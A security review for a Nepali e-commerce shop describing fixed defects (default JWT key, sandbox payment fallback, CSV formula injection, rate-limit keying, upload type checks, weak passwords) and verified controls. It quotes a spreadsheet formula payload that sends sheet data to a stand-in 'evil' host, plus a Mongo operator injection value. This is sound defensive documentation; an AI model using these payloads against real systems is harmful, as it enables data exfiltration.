# Security review

A record of what was audited before this shop went commercial: what was found, what was fixed, and what is still your responsibility. Written to be read by whoever operates the shop, not only by whoever wrote it.

---

## Issues found and fixed

Six real defects, ordered by how much damage each could have done.

### 1. Production could boot with a publicly-known signing key

`assertProductionEnv()` required `JWT_SECRET` to be at least 32 characters. The placeholder in `.env.example` — `change-me-to-a-random-string-of-at-least-32-chars` — is 49 characters, so it passed.

Anyone deploying by copying `.env.example` to `.env`, which is exactly what the file invites, would have signed every session with a key published in this repository. Forging an admin session would be a five-line script.

**Fixed** in [server/src/config/env.js](../server/src/config/env.js): substring matching on `change-me`, `your-secret`, `replace-me` and `xxxxx`, so editing the placeholder into `change-me-later` does not sneak past either. Verified against nine boot configurations.

### 2. Sandbox payment credentials were the production default

`ESEWA_SECRET_KEY` fell back to eSewa's published sandbox key `8gBm/:&EnhH.1/q` in **every** environment, `ESEWA_MERCHANT_ID` to `EPAYTEST`.

A shop that never set these would have run live checkout against sandbox credentials: eSewa approves the redirect, the order is marked paid, and no money is collected. Silent revenue loss with no error anywhere.

**Fixed** in two parts. The guard now rejects sandbox values outright in production. Separately, the sandbox fallbacks now apply *only* outside production — in production an unset key means "this gateway is off", so a cash-on-delivery shop deploys cleanly instead of being unable to boot at all.

### 3. CSV formula injection in admin exports (CWE-1236)

Every field in the export was quoted, which stops column-shifting but does nothing about formulas. Quotes are consumed by the CSV parser; whatever follows is evaluated by Excel.

A customer registering as `=HYPERLINK("http://evil/?"&A1,"Click")` would have that formula execute the moment an admin opened the orders export — exfiltrating the rest of the sheet. Customer names, addresses and order notes all reach the export unmodified.

**Fixed** in [server/src/utils/csv.js](../server/src/utils/csv.js): values beginning `= + - @`, tab or carriage return are prefixed with an apostrophe, which spreadsheets read as "this is text" and do not display. Numbers and booleans are generated server-side and stay numeric.

### 4. Per-account rate limiting was silently disabled on login

`authLimiter` keyed on `req.body.email`. The login endpoint accepts an email *or* a phone number in a field called `identifier`. So the key was always `ip:` — every login from one address shared a single bucket.

The code comment said the key existed so "one attacker cannot lock out a whole NAT range", which is precisely what it no longer prevented. In Nepal, where a whole city can sit behind one carrier-grade NAT address, twelve failed logins from any one customer would have locked out everyone else.

**Fixed** in [server/src/middleware/rateLimiter.js](../server/src/middleware/rateLimiter.js): reads `identifier` with `email` as fallback, covering login, registration and password reset. Verified that a locked-out account no longer affects a second account from the same IP.

### 5. Uploads trusted the browser's declared file type

The multer allow-list checked the `Content-Type` the client *claimed*. A PHP web shell or an HTML file with `type=image/png` was accepted and written to disk.

Not exploitable as deployed — uploads are staff-only, responses carry `nosniff`, and the static handler forces an image type — but it is one configuration change away from being serious.

**Fixed** in [server/src/services/imageStorage.js](../server/src/services/imageStorage.js): magic-byte validation for JPEG, PNG, WebP and AVIF. The bytes must match the declared type. Covered by a regression test that uploads PHP source labelled as a PNG.

### 6. Weak passwords were accepted

The policy was length-only — deliberately, following NIST guidance, which is correct as far as it goes. The half that was missing is NIST's *other* requirement: screening against known-breached passwords. `password` and `12345678` were both accepted.

**Fixed** in [server/src/validators/common.js](../server/src/validators/common.js): a blocklist of the most-guessed passwords, including Nepal-specific ones (`nepal123`, `kathmandu`, `namaste123`) that a global list would miss.

---

## Verified as already correct

These were tested against a running server and behaved properly. Listed because "we checked this" is worth as much as "we fixed this".

**Money.** Prices, discounts, delivery and totals are computed server-side in `PaymentService` and `pricingService`. A client that submits its own `price`, `total` or `subtotal` has those fields ignored entirely — verified by injecting a price of 1 into a cart quote and by claiming a subtotal of 999999 against a coupon minimum. Order payloads have no price field at all by design.

**Payment trust boundary.** No order is marked paid from a frontend redirect. eSewa is verified by HMAC signature, Khalti by a server-to-server lookup, and both happen in the provider classes behind `PaymentService` — gateway logic never enters `OrderController`.

**Authorization.** Admin endpoints require a valid JWT *and* a role. Tested anonymous (401), customer (403) and admin (200) against the same endpoint — both halves, so a route broken shut would fail the test too.

**Access control on orders.** One customer cannot read or cancel another's order; the response is identical whether the order belongs to someone else or does not exist.

**Mass assignment.** `role`, `tokenVersion` and `emailVerified` submitted to registration and profile update are stripped.

**Injection.** Mongo operators smuggled into string fields (`{"$ne": null}`) are rejected by Zod before reaching the database. Contact-form HTML is stripped server-side.

**Password reset.** Uniform responses whether or not the address exists; forged tokens rejected; the victim's password unchanged.

**Login enumeration.** Identical message and timing for unknown account and wrong password.

**Transport and headers.** Helmet CSP, `nosniff`, `X-Frame-Options: DENY`, HSTS in production. Cookies are `httpOnly`, `Secure` in production, `SameSite=Lax`. No token is ever written to `localStorage`.

**Dependencies.** `npm audit --omit=dev` — zero vulnerabilities.

**Secrets.** No credential appears in the client bundle; `.env` is git-ignored; `/.env` and path-traversal attempts return 404. Stack traces are suppressed in production.

---

## Your responsibilities

The application is hardened. These are operational, and no amount of code can do them for you.

**Rotate the seed admin password.** It has existed in a `.env` file and in your host's dashboard. Change it from the account page after your first login.

**Keep `MONGO_URI` blank in local development.** After seeding production, restore it. A local `.env` still pointing at Atlas means the next `npm run seed:reset` wipes the live shop. This is the most likely way to lose real data.

**Never commit `.env`.** Verify with `git check-ignore server/.env`.

**Use live payment credentials, not sandbox.** The server enforces this at boot, but understand *why*: sandbox credentials in production approve payments that collect no money.

**Back up before you need to.** Atlas M0 has no automated backups. `mongodump` monthly once you have real orders.

**Watch the rate limits.** Defaults are 300 requests per 15 minutes generally, 12 on auth. Raise `RATE_LIMIT_MAX` if legitimate traffic gets 429s; lower it if you see scripted abuse.

---

## Known limitations

Honest gaps. None is a defect; each is a decision with a cost.

**Registration reveals whether an email is taken.** Login and password reset are uniform, but registration must tell you the address is in use or the form cannot work. Standard for e-commerce, and a deliberate trade against usability.

**No 2FA on admin accounts.** Worth adding before the shop handles significant volume.

**No account lockout after repeated failures** — rate limiting only. Lockout is a denial-of-service vector against your own customers, which is why it was not added.

**Sessions are not revocable individually.** `tokenVersion` invalidates *all* of a user's sessions at once. There is no "sign out my other devices".

**CSRF exempts Bearer tokens.** Correct — Bearer auth is not cookie-driven, so CSRF does not apply — but it means any future client using Bearer tokens must protect its own token storage.

**Audit logging is minimal.** Admin actions are not recorded to a tamper-evident log. If several people get admin access, add one.

---

## Automated regression tests

`npm run test --workspace=server` boots the real Express app against an in-memory MongoDB and exercises the middleware chain — CSRF, rate limiting, auth guards, the error handler — rather than handlers in isolation. Fourteen tests cover the properties above that are cheap to assert and expensive to break:

- money is server-authoritative, injected prices ignored
- admin admitted and customer refused on the same endpoint
- anonymous reads of admin surfaces refused
- Mongo operators in string fields rejected
- uploads staff-gated; disguised non-images rejected on their bytes
- no secret in the public settings projection

These are the invariants worth failing a build over. Run them before every deploy.
